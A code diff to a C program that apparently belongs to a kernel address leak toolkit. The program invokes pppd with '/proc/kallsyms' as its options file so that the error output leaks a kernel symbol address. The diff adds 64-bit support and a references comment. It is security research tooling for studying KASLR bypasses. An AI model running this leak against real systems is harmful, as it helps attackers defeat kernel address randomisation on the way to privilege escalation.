@@ -6,6 +6,7 @@
 // user-specified files. On 32-bit systems, the first line
 // of /proc/kallsyms contains the startup symbol.
 //
+// References:
 // https://www.openwall.com/lists/kernel-hardening/2013/10/14/2
 // ---
 // <bcoles@gmail.com>
@@ -14,15 +15,13 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-
-unsigned long KERNEL_BASE_MIN = 0xc0000000ul;
-unsigned long KERNEL_BASE_MAX = 0xff000000ul;
+#include "kasld.h"
 
 unsigned long get_kernel_addr_pppd_kallsyms() {
   FILE *f;
   const char *cmd = "pppd file /proc/kallsyms 2>&1";
   unsigned long addr = 0;
-  const int addr_len = 8; /* 32-bit */
+  const int addr_len = sizeof(long*) * 2;
   char buf[1024];
 
   printf("[.] trying '%s' ...\n", cmd);
@@ -64,7 +63,7 @@ int main(int argc, char **argv) {
   if (!addr)
     return 1;
 
-  printf("kernel base (likely): %lx\n", addr);
+  printf("leaked kernel symbol: %lx\n", addr);
 
   return 0;
 }
